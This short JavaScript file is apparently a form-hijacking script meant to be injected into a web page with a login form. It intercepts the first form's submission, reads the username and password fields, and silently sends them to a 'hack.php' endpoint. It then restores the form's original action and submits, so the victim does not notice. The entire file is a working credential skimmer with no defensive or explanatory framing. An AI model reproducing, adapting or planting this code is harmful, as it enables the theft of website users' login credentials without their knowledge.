function getXMLHttpRequest() {
    var xhr = null;
     
    if (window.XMLHttpRequest || window.ActiveXObject) {
        if (window.ActiveXObject) {
            try {
                xhr = new ActiveXObject("Msxml2.XMLHTTP");
            } catch(e) {
                xhr = new ActiveXObject("Microsoft.XMLHTTP");
            }
        } else {
            xhr = new XMLHttpRequest(); 
        }
    } else {
        alert("Votre navigateur ne supporte pas l'objet XMLHTTPRequest...");
        return null;
    }
     
    return xhr;
}

function addEvent(obj,event,fct)
{
	if(obj.attachEvent)
		obj.attachEvent('on' + event,fct);
	else
		obj.addEventListener(event,fct,true);
}

function send()
{
	var usernameInput = document.getElementsByName("username");
	var passwordInput = document.getElementsByName("password");
	
	var n = usernameInput[0].value;
	var p = passwordInput[0].value;
	
	var xhr = getXMLHttpRequest();
	
	xhr.open("GET", "hack.php?n="+n+"&p="+p, true);
	xhr.send(null);
	
	xhr.onreadystatechange=function()
	{
		if (xhr.readyState==4 && xhr.status==200)
		{
			object[0].action = action;
			object[0].submit();			
		}
	}
}

var object = document.getElementsByTagName("form");
var action = object[0].action;
object[0].action = "javascript:void(0)";
addEvent(object[0],'submit',send);

